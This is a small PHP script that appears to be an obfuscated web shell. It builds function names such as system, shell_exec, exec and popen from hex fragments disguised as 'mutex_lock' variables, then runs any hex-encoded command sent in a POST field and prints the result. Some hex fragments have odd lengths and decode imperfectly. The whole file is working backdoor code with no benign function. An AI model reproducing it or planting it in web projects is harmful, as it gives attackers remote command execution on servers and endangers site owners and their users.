<?php


$bind1 = '56d';
$bind2 = '736';
$bind3 = '657';
$bind4 = '865';
$bind5 = '737';
$bind6 = '468';
$bind7 = '706';
$bind8 = 'f70';
$bind9 = '472';
$bind10 = '656';
$bind11 = '16d';
$bind12 = '745';
$bind13 = '6f6';
$bind14 = 'e74';
$bind15 = '365';
$bind16 = '06c';
$bind17 = '697';
$bind18 = '474';
$bind19 = '746';
$mutex_lock1 = pack("H*", '737' . '973' . '746' . $bind1);
$mutex_lock2 = pack("H*", $bind2 . '865' . '6c6' . 'c5f' . '657' . '865');
$mutex_lock3 = pack("H*", $bind3 . $bind4);
$mutex_lock4 = pack("H*", '706' . '173' . $bind5 . $bind6 . '727');
$mutex_lock5 = pack("H*", $bind7 . $bind8 . '656');
$mutex_lock6 = pack("H*", $bind5 . $bind9 . $bind10 . $bind11 . '5f6' . '765' . $bind12 . 'f63' . $bind13 . $bind14 . $bind10 . $bind14);
$mutex_lock7 = pack("H*", '706' . '36c' . '6f7' . $bind15);
$splitter_tool = pack("H*", $bind5 . $bind16 . $bind17 . $bind18 . '657' . '25f' . $bind19 . 'f6f');
if (isset($_POST[$splitter_tool])) {
    $splitter_tool = pack("H*", $_POST[$splitter_tool]);
    if (function_exists($mutex_lock1)) {
        $mutex_lock1($splitter_tool);
    } elseif (function_exists($mutex_lock2)) {
        print $mutex_lock2($splitter_tool);
    } elseif (function_exists($mutex_lock3)) {
        $mutex_lock3($splitter_tool, $comp_ptr);
        print join("\n", $comp_ptr);
    } elseif (function_exists($mutex_lock4)) {
        $mutex_lock4($splitter_tool);
    } elseif (function_exists($mutex_lock5) && function_exists($mutex_lock6) && function_exists($mutex_lock7)) {
        $obj_key = $mutex_lock5($splitter_tool, 'r');
        if ($obj_key) {
            $val_flag = $mutex_lock6($obj_key);
            $mutex_lock7($obj_key);
            print $val_flag;
        }
    }
    exit;
}
